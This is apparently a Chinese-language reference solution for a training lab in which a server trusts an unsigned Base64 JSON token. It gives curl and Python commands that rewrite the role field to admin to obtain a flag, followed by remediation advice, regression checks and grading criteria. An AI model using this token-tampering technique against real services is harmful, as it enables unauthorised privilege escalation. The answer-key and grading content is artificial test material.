# 数据完整性：未签名令牌 · 参考解答

## 目标与实现边界

本靶机的“令牌”只是 **Base64 编码的 JSON**，不是 JWT，也没有签名段。`/profile` 仅检查解码后对象的 role 是否为 admin，直接把客户端声明当成权限依据。

## 复现步骤

1. 访问 `/token` 获取普通用户令牌。它解码后为 `{"user":"student","role":"student"}`。
2. 把原令牌提交到首页的身份资料表单，预期显示“普通用户资料”，作为未提升角色时的基线。
3. 保持 user 为 student，只将 role 改为 admin，然后重新进行 Base64 编码。
4. 提交修改后的令牌，预期得到本次 Flag，说明服务器没有验证数据的来源与完整性。

```bash
TARGET='http://TARGET_IP:8000'
TOKEN=$(curl -sS "$TARGET/token")
printf '%s' "$TOKEN" | python3 -c 'import sys,base64; print(base64.b64decode(sys.stdin.read()).decode())'
curl -sS "$TARGET/profile" --data-urlencode "token=$TOKEN"
ADMIN_TOKEN=$(python3 -c 'import base64,json; print(base64.b64encode(json.dumps({"user":"student","role":"admin"}).encode()).decode())')
curl -sS "$TARGET/profile" --data-urlencode "token=$ADMIN_TOKEN"
```

## 预期现象与常见误区

必须提交正确编码的 JSON 对象，而不是直接提交 JSON、增加 JWT 的点号分段或仅修改外层字符串。非法 Base64/JSON 预期返回 400；普通角色返回普通资料；admin 角色返回 Flag。

字段名和值大小写应符合实现：`role`、`admin`。本路径并未要求 user 同时改为 admin，因此只改 role 能更清楚地定位信任缺陷。Base64 可逆不代表任何使用 Base64 的令牌都不安全；问题在于服务器未验证完整性就信任权限字段。

## 修复思路与回归

优先使用服务端保存权限的会话机制，或使用成熟的签名令牌实现并校验允许的算法、签名、发行者、受众和有效期。即使令牌有效，读取具体对象时仍要检查授权；不要自行设计“加点编码”的密码协议。

回归：篡改 role 而不具备合法签名时必须拒绝；合法普通用户保持原权限；合法管理令牌仅访问被授权资源；过期或上下文不匹配的令牌被拒绝。

## 本实验评估要点

要求原始与修改后语义的对比、重新编码及不同响应的证据。只把一段 Base64 提交到表单不足以说明篡改了什么。接受其他合法 JSON 序列化或编码工具，不按编码后字符串是否逐字相同评分。
